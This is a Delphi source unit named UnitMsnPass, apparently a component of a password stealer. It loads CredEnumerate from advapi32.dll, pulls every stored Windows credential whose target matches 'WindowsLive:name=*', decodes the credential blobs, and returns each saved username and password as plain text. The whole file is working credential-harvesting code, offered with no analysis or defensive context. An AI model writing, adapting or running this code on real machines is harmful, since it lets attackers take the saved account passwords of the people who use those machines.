unit UnitMsnPass;

interface

uses
 Windows;

type
 CREDENTIAL_ATTRIBUTEA = record
  Keyword: LPSTR;
  Flags: DWORD;
  ValueSize: DWORD;
  Value: PBYTE;
 end;
 PCREDENTIAL_ATTRIBUTE = ^CREDENTIAL_ATTRIBUTEA;

 CREDENTIALA = record
  Flags: DWORD;
  Type_: DWORD;
  TargetName: LPSTR;
  Comment: LPSTR;
  LastWritten: FILETIME;
  CredentialBlobSize: DWORD;
  CredentialBlob: DWORD;
  Persist: DWORD;
  AttributeCount: DWORD;
  Attributes: PCREDENTIAL_ATTRIBUTE;
  TargetAlias: LPSTR;
  UserName: LPSTR;
 end;
 PCREDENTIAL = array of ^CREDENTIALA;

var
 pfCredEnumerate: function(Filter: LPCSTR; Flags: DWORD; var Count: DWORD; var Credential: PCREDENTIAL): BOOL; stdcall;
 pfCredFree: function(Buffer: Pointer): BOOL; stdcall;

 function ObtainPasswords: string;

implementation

function Trim(S: String): String;
var
 I, Count: Integer;
begin
 if s = '' then exit;
 I := Length(S);
 Count:= 1;
 repeat
  if Copy(S, Count, 1) <> #0 then Result := Result + Copy(S, Count, 1);
  Inc(Count)
 until Count = I;
end;

function LoadFunctions: bool;
var
 Handle: THandle;
begin
 Result := False;

 Handle := GetModuleHandle('advapi32.dll');
 if Handle = 0 then Handle := LoadLibrary('advapi32.dll');
 if Handle = 0 then exit;

 {$IFDEF UNICODE}
  @pfCredEnumerate := GetProcAddress(Handle, 'CredEnumerateW');
 {$ELSE}
  @pfCredEnumerate := GetProcAddress(Handle, 'CredEnumerateA');
 {$ENDIF UNICODE}
  @pfCredFree := GetProcAddress(Handle, 'CredFree');

  if (@pfCredEnumerate <> nil) and (@pfCredFree <> nil) then Result := True;

end;

//'WindowsLive:name=*'
function ObtainPasswords: string;
var
 dwCount, dwTempIndex: DWord;
 Username, Password: String;
 CredentialCollection: PCredential;
begin
 dwTempIndex := 0;
 dwCount := 0;
 Result := '';
 if not LoadFunctions then exit;
 if not pfCredEnumerate('WindowsLive:name=*', 0, dwCount, CredentialCollection) then exit;
 for dwTempIndex := 0 to dwCount-1 do begin
  Username := '';
  Password := '';
  Username := CredentialCollection[dwTempIndex].UserName;
  Password := Trim(String(CredentialCollection[dwTempIndex].CredentialBlob));
  //Password := String(CredentialCollection[dwTempIndex].CredentialBlob);
  Result := Result + UserName + '|' + Password + #13#10;
 end;
 //messagebox(0,'1','1',0);
 //pfCredFree(CredentialCollection);
 //messagebox(0,'2','2',0);
end;

end.
